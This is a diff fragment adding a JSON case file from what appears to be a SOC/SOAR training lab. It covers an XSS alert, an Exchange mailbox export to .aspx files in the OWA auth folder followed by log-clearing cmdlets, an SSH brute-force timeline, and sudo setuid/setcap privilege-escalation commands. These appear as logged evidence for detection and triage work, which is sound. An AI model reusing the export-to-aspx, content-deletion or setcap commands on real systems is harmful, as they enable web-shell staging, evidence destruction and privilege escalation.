+              "reason": "Week-2 reports prohibit automatic account action"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 3,
+          "file": "Week-3/SOAR/tickets/6ba5792eef667c9cf86fe718978b3c8b2ba892dd0968e5e3d30b66aeec678956.json",
+          "audit_file": "Week-3/SOAR/audit/6ba5792eef667c9cf86fe718978b3c8b2ba892dd0968e5e3d30b66aeec678956.jsonl"
+        },
+        {
+          "ticket_id": "843425fa737b11ef71fcf6f556f947753101d7825995b79bde68dca70a089769",
+          "playbook_id": "PB-03",
+          "tier": "Tier 1",
+          "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [
+            "propose_waf_rule_review"
+          ],
+          "proposed_detail": [
+            {
+              "action": "propose_waf_rule_review",
+              "requires": "analyst_approval",
+              "template": "Propose WAF rule review for {request_uri} (NOT executed)",
+              "rationale": "Week-2 XSS report §8; HTTP correlation gap means no source-block proposal"
+            }
+          ],
+          "prohibited_actions": [
+            "execute_rate_limit",
+            "execute_isolation",
+            "disable_account"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "execute_rate_limit",
+              "reason": "HTTP correlation gap (Week-2 acceptance gate 2) — cannot block source safely"
+            },
+            {
+              "action": "execute_isolation",
+              "reason": "Tier 2 prohibited"
+            },
+            {
+              "action": "disable_account",
+              "reason": "Week-2 reports prohibit automatic account action"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 2,
+          "file": "Week-3/SOAR/tickets/843425fa737b11ef71fcf6f556f947753101d7825995b79bde68dca70a089769.json",
+          "audit_file": "Week-3/SOAR/audit/843425fa737b11ef71fcf6f556f947753101d7825995b79bde68dca70a089769.jsonl"
+        },
+        {
+          "ticket_id": "fad10ea2b71bb2bc091d15316bb97d5b5dc213b272c7dc1fa6f1b8feda26140a",
+          "playbook_id": "PB-03",
+          "tier": "Tier 1",
+          "qa_status": "SCHEMA_PASS_HUMAN_REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [
+            "propose_waf_rule_review"
+          ],
+          "proposed_detail": [
+            {
+              "action": "propose_waf_rule_review",
+              "requires": "analyst_approval",
+              "template": "Propose WAF rule review for {request_uri} (NOT executed)",
+              "rationale": "Week-2 XSS report §8; HTTP correlation gap means no source-block proposal"
+            }
+          ],
+          "prohibited_actions": [
+            "execute_rate_limit",
+            "execute_isolation",
+            "disable_account"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "execute_rate_limit",
+              "reason": "HTTP correlation gap (Week-2 acceptance gate 2) — cannot block source safely"
+            },
+            {
+              "action": "execute_isolation",
+              "reason": "Tier 2 prohibited"
+            },
+            {
+              "action": "disable_account",
+              "reason": "Week-2 reports prohibit automatic account action"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 2,
+          "file": "Week-3/SOAR/tickets/fad10ea2b71bb2bc091d15316bb97d5b5dc213b272c7dc1fa6f1b8feda26140a.json",
+          "audit_file": "Week-3/SOAR/audit/fad10ea2b71bb2bc091d15316bb97d5b5dc213b272c7dc1fa6f1b8feda26140a.jsonl"
+        }
+      ],
+      "benign_control": false,
+      "limitations": [
+        "HTTP 200 does not prove successful XSS execution.",
+        "Original event timestamps represent historical laboratory data.",
+        "SIEM trigger does not independently prove browser-side execution."
+      ],
+      "attack": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "tactic": "Initial Access",
+          "confidence": "candidate",
+          "basis": "Script-injection payload in request_uri (SIEM07 evidence); browser-side execution not established"
+        }
+      ],
+      "stage_id": "S2"
+    },
+    {
+      "case_id": "SIEM-EXCH-005",
+      "title": "Exchange mailbox export to OWA .aspx path",
+      "domain": "email",
+      "source_kind": "siem_alert",
+      "detection_rule": "SIEM_EXCHANGE_005_SUSPICIOUS_MAILBOX_EXPORT",
+      "playbook": "PB-04",
+      "dataset": "depi_exchange_events",
+      "evidence_files": [
+        {
+          "path": "Week-2/Evidence/SIEM-OpenObserve/SIEM_EXCHANGE_005_21c4515e439a0b3b6a3f_AI_Triage.json",
+          "sha256": "c1a8ccc7d28eeb8d760afdcdda9ccb4d615e4da32818158d033e8e422c75dbad"
+        },
+        {
+          "path": "Week-2/Results/SIEM_EXCHANGE_005_Human_Reviewed.json",
+          "sha256": "6868368ed2b215b5e7084c6f9d35a2b05f65b868192d5f581a585edd3e68e64f"
+        },
+        {
+          "path": "Week-2/Data/Exchange/msexchangemanagement.log",
+          "sha256": "7250afa0f319471e29aed8a85c641ba5c4ebef127c88846b8ca30e59e5bdbf27"
+        }
+      ],
+      "facts": {
+        "host": "win-dc-exch01.attackrange.local",
+        "aspx_paths": [
+          "\\\\win-dc-exch01.attackrange.local\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ZnTQs2wv.aspx",
+          "\\\\win-dc-exch01.attackrange.local\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\43yYO1sP.aspx"
+        ],
+        "export_names": [
+          "OnmrPW8m8Uv",
+          "dYbLTCleBT"
+        ],
+        "mailbox": "Administrator@attackrange.local",
+        "unique_events": 2,
+        "removed_exports": [
+          "OnmrPW8m8Uv",
+          "dYbLTCleBT"
+        ],
+        "role_assignments": 2,
+        "content_deletions": 2
+      },
+      "events": [
+        {
+          "ts_original": "11/21/2022 05:21:55 PM",
+          "ts_quality": "original_no_timezone",
+          "summary": "[cmdlet audit log] New-ManagementRoleAssignment on win-dc-exch01.attackrange.local (record 1788): Cmdlet suceeded. Cmdlet New-ManagementRoleAssignment, parameters -Role \"Mailbox Import Export\" -User \"Administrator@attackrange.local\".",
+          "ref": "EXCH-R1788",
+          "source": "Week-2/Data/Exchange/msexchangemanagement.log"
+        },
+        {
+          "ts_original": "2022-11-21T17:22:01",
+          "ts_quality": "original_no_timezone",
+          "summary": "New-MailboxExportRequest on win-dc-exch01.attackrange.local for Administrator@attackrange.local to \\\\win-dc-exch01.attackrange.local\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ZnTQs2wv.aspx (record 1789)",
+          "ref": "EXCH-R1789",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM_EXCHANGE_005_21c4515e439a0b3b6a3f_AI_Triage.json"
+        },
+        {
+          "ts_original": "11/21/2022 05:27:25 PM",
+          "ts_quality": "original_no_timezone",
+          "summary": "[cmdlet audit log] Remove-MailboxExportRequest on win-dc-exch01.attackrange.local (record 1793): Cmdlet suceeded. Cmdlet Remove-MailboxExportRequest, parameters -Identity \"Administrator@attackrange.local\\OnmrPW8m8Uv\" -Confirm \"False\".",
+          "ref": "EXCH-R1793",
+          "source": "Week-2/Data/Exchange/msexchangemanagement.log"
+        },
+        {
+          "ts_original": "11/21/2022 05:27:27 PM",
+          "ts_quality": "original_no_timezone",
+          "summary": "[cmdlet audit log] Search-Mailbox on win-dc-exch01.attackrange.local (record 1794): Cmdlet suceeded. Cmdlet Search-Mailbox, parameters -Identity \"Administrator@attackrange.local\" -SearchQuery \"Subject:\"AvcMRhPdI\"\" -Force \"True\" -DeleteContent \"True\".",
+          "ref": "EXCH-R1794",
+          "source": "Week-2/Data/Exchange/msexchangemanagement.log"
+        },
+        {
+          "ts_original": "11/21/2022 08:03:50 PM",
+          "ts_quality": "original_no_timezone",
+          "summary": "[cmdlet audit log] New-ManagementRoleAssignment on win-dc-exch01.attackrange.local (record 1891): Cmdlet suceeded. Cmdlet New-ManagementRoleAssignment, parameters -Role \"Mailbox Import Export\" -User \"Administrator@attackrange.local\".",
+          "ref": "EXCH-R1891",
+          "source": "Week-2/Data/Exchange/msexchangemanagement.log"
+        },
+        {
+          "ts_original": "2022-11-21T20:03:51",
+          "ts_quality": "original_no_timezone",
+          "summary": "New-MailboxExportRequest on win-dc-exch01.attackrange.local for Administrator@attackrange.local to \\\\win-dc-exch01.attackrange.local\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\43yYO1sP.aspx (record 1892)",
+          "ref": "EXCH-R1892",
+          "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM_EXCHANGE_005_21c4515e439a0b3b6a3f_AI_Triage.json"
+        },
+        {
+          "ts_original": "11/21/2022 08:09:02 PM",
+          "ts_quality": "original_no_timezone",
+          "summary": "[cmdlet audit log] Remove-MailboxExportRequest on win-dc-exch01.attackrange.local (record 1896): Cmdlet suceeded. Cmdlet Remove-MailboxExportRequest, parameters -Identity \"Administrator@attackrange.local\\dYbLTCleBT\" -Confirm \"False\".",
+          "ref": "EXCH-R1896",
+          "source": "Week-2/Data/Exchange/msexchangemanagement.log"
+        },
+        {
+          "ts_original": "11/21/2022 08:09:04 PM",
+          "ts_quality": "original_no_timezone",
+          "summary": "[cmdlet audit log] Search-Mailbox on win-dc-exch01.attackrange.local (record 1897): Cmdlet suceeded. Cmdlet Search-Mailbox, parameters -Identity \"Administrator@attackrange.local\" -SearchQuery \"Subject:\"Fay10dOWecFg\"\" -Force \"True\" -DeleteContent \"True\".",
+          "ref": "EXCH-R1897",
+          "source": "Week-2/Data/Exchange/msexchangemanagement.log"
+        }
+      ],
+      "event_count_total": 8,
+      "ai": {
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "severity": "High",
+        "confidence": "Medium",
+        "summary": "Two suspicious Exchange mailbox export requests were detected on win-dc-exch01.attackrange.local, potentially indicating unauthorized data exfiltration.",
+        "qa_status": "REVIEW_REQUIRED",
+        "human_validation_required": true,
+        "semantic_warnings": [],
+        "generated_at_utc": "2026-11-02T18:32:13.521911+00:00",
+        "trigger_fired_utc": null,
+        "trigger_to_ai_triage_seconds": null,
+        "trigger_key": null,
+        "source": "Week-2/Evidence/SIEM-OpenObserve/SIEM_EXCHANGE_005_21c4515e439a0b3b6a3f_AI_Triage.json"
+      },
+      "human_review": {
+        "status": "PENDING_HUMAN_APPROVAL",
+        "disposition": "SUSPICIOUS_ACTIVITY_INVESTIGATION_REQUIRED",
+        "severity": "HIGH_PROVISIONAL",
+        "semantic_warnings": [
+          "The original AI summary suggests possible unauthorized data exfiltration; no unauthorized access or exfiltration is confirmed.",
+          "The AI omitted the key indicator: ASPX export destinations within the Exchange OWA web directory.",
+          "The source log reports cmdlet success, but actual export completion and file creation are not independently verified.",
+          "The AI incorrectly categorized the original-versus-replay timestamp distinction as an unverified hypothesis.",
+          "The AI repeated missing-evidence items under unverified hypotheses instead of separating hypotheses from verification requirements.",
+          "The original semantic_warnings array was empty despite these review findings."
+        ],
+        "source": "Week-2/Results/SIEM_EXCHANGE_005_Human_Reviewed.json"
+      },
+      "tickets": [
+        {
+          "ticket_id": "21c4515e439a0b3b6a3f",
+          "playbook_id": "PB-04",
+          "tier": "Tier 0",
+          "qa_status": "REVIEW_REQUIRED",
+          "review_status": "Pending Review",
+          "analyst_decision": null,
+          "proposed_actions": [],
+          "proposed_detail": [],
+          "prohibited_actions": [
+            "propose_export_revocation",
+            "execute_isolation",
+            "disable_account",
+            "delete_export_request",
+            "execute_rate_limit"
+          ],
+          "prohibited_detail": [
+            {
+              "action": "propose_export_revocation",
+              "reason": "Exchange receiver hard-codes qa_status=REVIEW_REQUIRED; no proposed response actions permitted"
+            },
+            {
+              "action": "execute_isolation",
+              "reason": "Tier 2 prohibited"
+            },
+            {
+              "action": "disable_account",
+              "reason": "Exchange report §11: 'Do not automatically isolate hosts or disable accounts'"
+            },
+            {
+              "action": "delete_export_request",
+              "reason": "Evidence unverified; no filesystem/IIS proof of completion"
+            },
+            {
+              "action": "execute_rate_limit",
+              "reason": "Tier 2 prohibited"
+            }
+          ],
+          "auto_actions": [
+            "parse",
+            "enrich(stub)",
+            "create_ticket",
+            "notify",
+            "audit"
+          ],
+          "audit_lines": 3,
+          "file": "Week-3/SOAR/tickets/21c4515e439a0b3b6a3f.json",
+          "audit_file": "Week-3/SOAR/audit/21c4515e439a0b3b6a3f.jsonl"
+        }
+      ],
+      "benign_control": false,
+      "limitations": [
+        "The export requests were unauthorized.",
+        "The ASPX destination paths were intended for web-shell staging.",
+        "The requested export operations resulted in actual files on disk.",
+        "Any web shell was deployed, accessed, or executed.",
+        "Any mailbox data was successfully exfiltrated.",
+        "Cmdlet audit log shows the export requests were removed and Search-Mailbox -DeleteContent ran after each export; export file creation on disk is still not shown by any log in the repository."
+      ],
+      "attack": [
+        {
+          "technique": "T1114.002",
+          "name": "Email Collection: Remote Email Collection",
+          "tactic": "Collection",
+          "confidence": "candidate",
+          "basis": "Two New-MailboxExportRequest cmdlets for Administrator@attackrange.local (Exchange 005 evidence); completion unverified"
+        },
+        {
+          "technique": "T1505.003",
+          "name": "Server Software Component: Web Shell",
+          "tactic": "Persistence",
+          "confidence": "hypothesis",
+          "basis": "Export FilePath points to .aspx under OWA auth directory; Week-2 lists web-shell deployment as an unverified hypothesis"
+        },
+        {
+          "technique": "T1098",
+          "name": "Account Manipulation",
+          "tactic": "Persistence",
+          "confidence": "observed_pattern",
+          "basis": "New-ManagementRoleAssignment -Role 'Mailbox Import Export' -User Administrator before each export (msexchangemanagement.log records 1788, 1891); authorisation unknown"
+        },
+        {
+          "technique": "T1070.008",
+          "name": "Indicator Removal: Clear Mailbox Data",
+          "tactic": "Defense Evasion",
+          "confidence": "observed_pattern",
+          "basis": "Remove-MailboxExportRequest and Search-Mailbox -DeleteContent after each export (msexchangemanagement.log records 1793-1794, 1896-1897)"
+        }
+      ],
+      "stage_id": "S9"
+    },
+    {
+      "case_id": "LT-01",
+      "title": "SSH password guessing (verified timeline)",
+      "domain": "auth",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv",
+          "sha256": "9ed1c4217bdc4090092512e2c65553ed8d3cb70bb7aca24c08995a2529e7eabe"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Case-Study.md",
+          "sha256": "72bac9880d0a677f6f696909ec225632cdd3b5b09c96ec8ec697bab669ad2e33"
+        }
+      ],
+      "facts": {
+        "host": "LabSZ",
+        "source_ip": "183.62.140.253",
+        "usernames": [
+          "dff",
+          "root",
+          "zhangyan"
+        ],
+        "event_types": {
+          "invalid_user_reference": 3,
+          "pam_authentication_failure": 13,
+          "failed_password": 13,
+          "session_disconnection": 12,
+          "other_sshd_context": 1
+        }
+      },
+      "events": [
+        {
+          "ts_original": "Dec 10 10:54:27",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "invalid_user_reference",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:27",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:29",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=zhangyan from 183.62.140.253",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:29",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:29",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "invalid_user_reference",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:29",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "invalid_user_reference",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:29",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "other_sshd_context",
+          "ref": "E007",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:29",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E008",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:31",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=dff from 183.62.140.253",
+          "ref": "E009",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:31",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E010",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:31",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E011",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:33",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E012",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:33",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E013",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:33",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E014",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:35",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E015",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:35",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E016",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:35",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:37",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:37",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E019",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:37",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E020",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:39",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E021",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:39",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E022",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:39",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E023",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:41",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E024",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:41",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E025",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:41",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E026",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:43",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E027",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:43",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E028",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:43",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E029",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:45",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E030",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:45",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E031",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:45",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E032",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:47",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E033",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:47",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E034",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:47",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E035",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:49",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E036",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:49",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E037",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:49",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E038",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:50",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E039",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:50",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "session_disconnection",
+          "ref": "E040",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:51",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "pam_authentication_failure",
+          "ref": "E041",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Dec 10 10:54:52",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "failed_password user=root from 183.62.140.253",
+          "ref": "E042",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 42,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 4,
+        "runs_reviewed": 1,
+        "final_analysis_id": "AN-20261018-183730-901f",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 15.62,
+        "wall_seconds": 79.61,
+        "validator_flags": 6,
+        "validator_severity_counts": {
+          "high": 3,
+          "medium": 3,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed WaLid",
+        "correct_findings": 6,
+        "incorrect_findings": 4,
+        "hallucinations_recorded": 3,
+        "source": "Week-2/Results/AN-20261018-183730-901f/analysis.json",
+        "all_runs": [
+          "AN-20261018-183730-901f",
+          "AN-20261103-011955-8006",
+          "AN-20261103-012133-14d3",
+          "AN-20261103-012225-6bcf"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed WaLid",
+        "source": "Week-2/Results/AN-20261018-183730-901f/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [],
+      "attack": [
+        {
+          "technique": "T1110.001",
+          "name": "Brute Force: Password Guessing",
+          "tactic": "Credential Access",
+          "confidence": "observed_pattern",
+          "basis": "Repeated failed passwords / invalid users from 183.62.140.253 (LT-01 verified timeline)"
+        }
+      ],
+      "stage_id": "S3"
+    },
+    {
+      "case_id": "LT-02",
+      "title": "Privilege-sensitive sudo commands",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv",
+          "sha256": "d733d95d3d5533dfb6a1697ef2f47b7a34b632c0b3f6d573af4829eba63a2c23"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Case-Study.md",
+          "sha256": "8445889a3618db3425faa7aff0b420fd78e856ff837d4cc2f9882358bf853d8d"
+        }
+      ],
+      "facts": {
+        "distinct_commands": 5,
+        "commands": {
+          "sudo systemctl status auditd.service": 3,
+          "sudo systemctl status SplunkForwarder.service": 3,
+          "sudo /opt/splunkforwarder/bin/splunk restart": 3,
+          "sudo chmod u+s vuln": 6,
+          "sudo setcap cap_setuid+ep ./priv_esc": 6
+        }
+      },
+      "events": [
+        {
